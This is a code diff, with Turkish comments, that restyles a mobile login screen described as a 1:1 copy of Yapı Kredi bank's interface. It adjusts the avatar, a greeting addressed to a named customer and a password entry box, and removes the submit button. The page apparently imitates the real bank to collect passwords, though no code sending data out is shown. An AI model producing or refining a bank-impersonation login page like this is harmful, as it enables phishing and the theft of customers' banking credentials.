@@ -1622,43 +1622,47 @@
             flex-direction: column;
             align-items: center;
             text-align: center;
-            padding: 10px 20px 0;
+            padding: 10px 18px 0;
             width: 100%;
-            max-width: 380px;
+            max-width: 410px;
             margin: 0 auto;
             box-sizing: border-box;
         }
 
+        /* Yuvarlak profil resmi yeri - etrafında ince beyaz/gümüş çizgi */
         .ykb-avatar-wrap {
             position: relative;
-            width: 110px;
-            height: 110px;
-            min-width: 110px;
-            min-height: 110px;
+            width: 114px;
+            height: 114px;
+            min-width: 114px;
+            min-height: 114px;
             border-radius: 50%;
-            background: #dbe2ea;
+            background: #eef2f7;
+            border: 1.5px solid rgba(255, 255, 255, 0.6) !important;
             display: flex;
             align-items: center;
             justify-content: center;
             cursor: pointer;
-            box-shadow: 0 4px 16px rgba(0,0,0,0.3);
-            margin: 0 auto;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+            margin: 10px auto 0;
+            box-sizing: border-box;
         }
 
+        /* Mavi rozet ve içi boş ince parmak simgesi */
         .ykb-avatar-badge {
             position: absolute;
-            bottom: 2px;
-            right: 2px;
-            width: 32px;
-            height: 32px;
+            bottom: 1px;
+            right: 1px;
+            width: 33px;
+            height: 33px;
             border-radius: 50%;
             background: #007bc7;
             border: 2.5px solid #000000;
             display: flex;
             align-items: center;
             justify-content: center;
-            color: #ffffff;
-            box-shadow: 0 2px 8px rgba(0, 123, 199, 0.4);
+            box-shadow: 0 2px 8px rgba(0, 123, 199, 0.45);
+            box-sizing: border-box;
         }
 
         .ykb-greeting-title {
@@ -1670,10 +1674,10 @@
             text-align: center;
         }
 
-        /* Beyaz Şifre Kutusu */
+        /* Uzunlamasına Beyaz Şifre Kutusu - Sağdaki mavi buton kaldırıldı */
         .ykb-password-box {
-            width: 100% !important;
-            max-width: 360px !important;
+            width: calc(100% - 32px) !important;
+            max-width: 395px !important;
             height: 52px !important;
             background: #ffffff !important;
             border-radius: 14px !important;
@@ -1682,9 +1686,9 @@
             align-items: center !important;
             padding: 0 16px !important;
             position: relative !important;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15) !important;
-            transition: transform 0.2s, box-shadow 0.2s;
-            cursor: text;
+            box-shadow: 0 4px 14px rgba(0, 0, 0, 0.2) !important;
+            transition: transform 0.2s, box-shadow 0.2s !important;
+            cursor: text !important;
             box-sizing: border-box !important;
         }
         .ykb-password-box.shake {
@@ -1699,8 +1703,12 @@
 
         .ykb-pass-lock-icon {
             color: #8e8e93;
-            font-size: 17px;
+            font-size: 18px;
+            width: 24px;
             flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
         }
 
         .ykb-pass-input {
@@ -1713,7 +1721,7 @@
             font-weight: 500 !important;
             color: #000000 !important;
             text-align: center !important;
-            padding: 0 8px !important;
+            padding: 0 4px !important;
             letter-spacing: 2px !important;
             height: 48px !important;
             line-height: 48px !important;
@@ -1725,28 +1733,9 @@
             font-weight: 400;
         }
 
-        .ykb-pass-action-btn {
-            background: transparent !important;
-            border: none !important;
-            color: #007bc7 !important;
-            font-size: 22px !important;
-            cursor: pointer;
-            padding: 0 !important;
-            display: flex !important;
-            align-items: center !important;
-            justify-content: center !important;
-            flex-shrink: 0;
-            outline: none !important;
-            box-shadow: none !important;
-            transition: transform 0.15s, opacity 0.2s;
-        }
-        .ykb-pass-action-btn:active {
-            transform: scale(0.9);
-        }
-
         .ykb-forgot-pass-row {
-            width: 100% !important;
-            max-width: 360px !important;
+            width: calc(100% - 32px) !important;
+            max-width: 395px !important;
             display: flex !important;
             justify-content: flex-end !important;
             margin: 12px auto 0 !important;
@@ -1769,8 +1758,8 @@
             font-size: 12px;
             margin-top: 10px;
             text-align: center;
-            width: 100%;
-            max-width: 360px;
+            width: calc(100% - 32px);
+            max-width: 395px;
             background: rgba(239, 68, 68, 0.15);
             padding: 6px 12px;
             border-radius: 8px;
@@ -2009,15 +1998,22 @@
             </div>
 
             <!-- ORTA ALAN: AVATAR + SELAMLAMA + BEYAZ ŞİFRE KUTUSU -->
-            <div class="ykb-login-center" style="display: flex; flex-direction: column; align-items: center; text-align: center; padding: 10px 20px 0; width: 100%; max-width: 380px; margin: 0 auto; box-sizing: border-box;">
-                <!-- Yuvarlak Profil Resmi + Mavi Dokunma Rozeti -->
-                <div class="ykb-avatar-wrap" onclick="openUserSwitcherSheet()" title="Kullanıcı Değiştir" style="position: relative; width: 110px; height: 110px; min-width: 110px; min-height: 110px; border-radius: 50%; background: #dbe2ea; display: flex; align-items: center; justify-content: center; cursor: pointer; box-shadow: 0 4px 16px rgba(0,0,0,0.3); margin: 0 auto;">
+            <div class="ykb-login-center" style="display: flex; flex-direction: column; align-items: center; text-align: center; padding: 10px 18px 0; width: 100%; max-width: 410px; margin: 0 auto; box-sizing: border-box;">
+                <!-- Yuvarlak Profil Resmi Yeri (Etrafında ince beyaz/gümüş çizgi) -->
+                <div class="ykb-avatar-wrap" onclick="openUserSwitcherSheet()" title="Kullanıcı Değiştir" style="position: relative; width: 114px; height: 114px; min-width: 114px; min-height: 114px; border-radius: 50%; background: #eef2f7; border: 1.5px solid rgba(255, 255, 255, 0.6) !important; display: flex; align-items: center; justify-content: center; cursor: pointer; box-shadow: 0 4px 20px rgba(0,0,0,0.4); margin: 10px auto 0; box-sizing: border-box;">
+                    <!-- Profil Silüeti -->
                     <svg width="68" height="68" viewBox="0 0 64 64" fill="none">
                         <circle cx="32" cy="22" r="13" fill="#cbd5e1"/>
                         <path d="M12 55C12 43 20.95 38 32 38C43.05 38 52 43 52 55" fill="#cbd5e1"/>
                     </svg>
-                    <div class="ykb-avatar-badge" title="Profil Değiştir" style="position: absolute; bottom: 2px; right: 2px; width: 32px; height: 32px; border-radius: 50%; background: #007bc7; border: 2.5px solid #000000; display: flex; align-items: center; justify-content: center; color: #ffffff;">
-                        <i class="bi bi-hand-index-thumb-fill" style="font-size: 15px; color: #ffffff; transform: rotate(-10deg);"></i>
+
+                    <!-- Sağ Alttaki Mavi Dokunma Rozeti: İçi dolu değil, ince zarif beyaz çizgi -->
+                    <div class="ykb-avatar-badge" title="Profil Değiştir" style="position: absolute; bottom: 1px; right: 1px; width: 33px; height: 33px; border-radius: 50%; background: #007bc7; border: 2.5px solid #000000; display: flex; align-items: center; justify-content: center; box-shadow: 0 2px 8px rgba(0, 123, 199, 0.45); box-sizing: border-box;">
+                        <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M10 2.5a1.5 1.5 0 0 1 3 0V11"/>
+                            <path d="M13 8.5a1.5 1.5 0 0 1 3 0v2"/>
+                            <path d="M16 10a1.5 1.5 0 0 1 3 0v1.5a5.5 5.5 0 0 1-5.5 5.5h-1a5.5 5.5 0 0 1-5-3.2l-1.2-2.3a1.4 1.4 0 0 1 2.4-1.4l1.3 1.9V2.5z"/>
+                        </svg>
                     </div>
                 </div>
 
@@ -2026,9 +2022,12 @@
                     İyi Geceler, BERKAY ÜLKER
                 </div>
 
-                <!-- Beyaz Şifre Hap Kutusu (Orijinal Yapı Kredi 1:1) -->
-                <div class="ykb-password-box" id="ykbPasswordBox" onclick="document.getElementById('ykbPasswordInput').focus()" style="width: 100%; max-width: 360px; height: 52px; background: #ffffff; border-radius: 14px; margin: 22px auto 0; display: flex; align-items: center; padding: 0 16px; position: relative; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15); box-sizing: border-box; cursor: text;">
-                    <i class="bi bi-lock-fill ykb-pass-lock-icon" style="color: #8e8e93; font-size: 17px; flex-shrink: 0;"></i>
+                <!-- Uzunlamasına Beyaz Şifre Kutusu: Sağdaki mavi şey YOK, ortada Şifre yazısı, solda gri kilit -->
+                <div class="ykb-password-box" id="ykbPasswordBox" onclick="document.getElementById('ykbPasswordInput').focus()" style="width: calc(100% - 32px) !important; max-width: 395px !important; height: 52px !important; background: #ffffff !important; border-radius: 14px !important; margin: 22px auto 0 !important; display: flex !important; align-items: center !important; padding: 0 16px !important; position: relative !important; box-shadow: 0 4px 14px rgba(0, 0, 0, 0.2) !important; box-sizing: border-box !important; cursor: text;">
+                    <!-- Solda Gri Kilit İkonu -->
+                    <i class="bi bi-lock-fill ykb-pass-lock-icon" style="color: #8e8e93; font-size: 18px; width: 24px; flex-shrink: 0; display: flex; align-items: center; justify-content: flex-start;"></i>
+
+                    <!-- Ortalanmış Şifre Alanı -->
                     <input 
                         type="password" 
                         id="ykbPasswordInput" 
@@ -2039,20 +2038,20 @@
                         autocomplete="current-password"
                         onkeydown="onPasswordKeyDown(event)"
                         oninput="onPasswordInput(event)"
-                        style="flex: 1; background: transparent; border: none; outline: none; box-shadow: none; font-size: 16px; font-weight: 500; color: #000000; text-align: center; padding: 0 8px; letter-spacing: 2px; height: 48px; line-height: 48px; box-sizing: border-box;"
+                        style="flex: 1; background: transparent; border: none !important; outline: none !important; box-shadow: none !important; font-size: 16px; font-weight: 500; color: #000000; text-align: center; padding: 0 4px; letter-spacing: 2px; height: 48px; line-height: 48px; box-sizing: border-box;"
                     />
-                    <button type="button" class="ykb-pass-action-btn" id="ykbPassSubmitBtn" onclick="doMobilePasswordLogin()" title="Giriş Yap" style="background: transparent; border: none; color: #007bc7; font-size: 22px; cursor: pointer; padding: 0; display: flex; align-items: center; justify-content: center; flex-shrink: 0; outline: none;">
-                        <i class="bi bi-arrow-right-circle-fill"></i>
-                    </button>
+
+                    <!-- Sağda Boş Dengeleyici: Mavi şey tamamen kaldırıldı, placeholder'ı ortada tutar -->
+                    <div style="width: 24px; flex-shrink: 0;" aria-hidden="true"></div>
                 </div>
 
                 <!-- Hata Bildirimi (Şifre Yanlış Olduğunda) -->
-                <div id="ykbLoginErrorBanner" class="ykb-login-error-msg" style="display: none; color: #f87171; font-size: 12px; margin-top: 10px; text-align: center; width: 100%; max-width: 360px; background: rgba(239, 68, 68, 0.15); padding: 6px 12px; border-radius: 8px; border: 1px solid rgba(239, 68, 68, 0.3); box-sizing: border-box;">
+                <div id="ykbLoginErrorBanner" class="ykb-login-error-msg" style="display: none; color: #f87171; font-size: 12px; margin-top: 10px; text-align: center; width: calc(100% - 32px); max-width: 395px; background: rgba(239, 68, 68, 0.15); padding: 6px 12px; border-radius: 8px; border: 1px solid rgba(239, 68, 68, 0.3); box-sizing: border-box;">
                     Girdiğiniz şifre hatalıdır. Lütfen kontrol ediniz.
                 </div>
 
-                <!-- Şifremi Unuttum Bağlantısı -->
-                <div class="ykb-forgot-pass-row" style="width: 100%; max-width: 360px; display: flex; justify-content: flex-end; margin: 12px auto 0; box-sizing: border-box;">
+                <!-- Şifremi Unuttum Bağlantısı: Sağ tarafa hizalı -->
+                <div class="ykb-forgot-pass-row" style="width: calc(100% - 32px); max-width: 395px; display: flex; justify-content: flex-end; margin: 12px auto 0; box-sizing: border-box;">
                     <a href="javascript:void(0)" class="ykb-forgot-pass-link" onclick="handleForgotPassword()" style="color: #ffffff; font-size: 13.5px; text-decoration: none; opacity: 0.95; cursor: pointer;">Şifremi Unuttum</a>
                 </div>
             </div>
